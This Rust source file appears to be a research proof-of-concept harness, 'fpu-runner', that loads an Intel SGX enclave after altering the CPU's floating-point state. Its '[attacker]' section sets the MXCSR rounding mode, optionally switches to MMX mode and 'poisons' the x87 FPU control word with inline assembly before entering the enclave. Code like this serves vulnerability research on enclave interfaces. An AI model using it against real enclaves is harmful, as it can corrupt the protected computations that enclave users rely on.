/* Copyright (c) Fortanix, Inc.
 *
 * This Source Code Form is subject to the terms of the Mozilla Public
 * License, v. 2.0. If a copy of the MPL was not distributed with this
 * file, You can obtain one at http://mozilla.org/MPL/2.0/. */
#![feature(asm)]

extern crate aesm_client;
extern crate enclave_runner;
extern crate sgxs_loaders;
extern crate failure;
#[macro_use]
extern crate clap;

use failure::_core::arch::x86_64::*;

use aesm_client::AesmClient;
use enclave_runner::EnclaveBuilder;
use failure::{Error, ResultExt};
#[cfg(unix)]
use sgxs_loaders::isgx::Device as IsgxDevice;
#[cfg(windows)]
use sgxs_loaders::enclaveapi::Sgx as IsgxDevice;

use clap::{App, Arg};

arg_enum!{
    #[derive(PartialEq, Debug)]
    #[allow(non_camel_case_types)]
    pub enum Signature {
        coresident,
        dummy
    }
}

fn main() -> Result<(), Error> {
    let args = App::new("fpu-runner")
        .arg(
            Arg::with_name("file")
                .required(true)
        )
        .arg(Arg::with_name("signature")
            .short("s")
            .long("signature")
            .required(false)
            .takes_value(true)
            .possible_values(&Signature::variants()))
        .arg(Arg::with_name("mmx")
            .long("mmx"))
        .arg(Arg::with_name("fpu")
            .takes_value(true)
            .long("fpu"))
        .get_matches();

    let file = args.value_of("file").unwrap();

    let mut device = IsgxDevice::new()
        .context("While opening SGX device")?
        .einittoken_provider(AesmClient::new())
        .build();

    let mut enclave_builder = EnclaveBuilder::new(file.as_ref());

    match args.value_of("signature").map(|v| v.parse().expect("validated")) {
        Some(Signature::coresident) => { enclave_builder.coresident_signature().context("While loading coresident signature")?; }
        Some(Signature::dummy) => { enclave_builder.dummy_signature(); },
        None => (),
    }

    let enclave = enclave_builder.build(&mut device).context("While loading SGX enclave")?;

    unsafe {
        //_mm_setcsr(0xffff);
        _MM_SET_ROUNDING_MODE(_MM_ROUND_UP);
        println!("[attacker] MXCSR={:#x}", _mm_getcsr());

        if args.is_present("mmx")
        {
            println!("[attacker] putting CPU in MMX mode..");
            asm!("paddd %mm0,%mm0");
        }
        if args.is_present("fpu")
        {
            let fpucw = args.value_of("fpu").unwrap().parse::<u16>().unwrap();
            println!("[attacker] poisoning FPUCW with {:#x}", fpucw);
            asm!("fldcw $0"
                        :: "m"(fpucw)
                      );
        }
    };

    enclave.run().map_err(|e| {
        eprintln!("Error while executing SGX enclave.\n{}", e);
        std::process::exit(-1)
    })
}
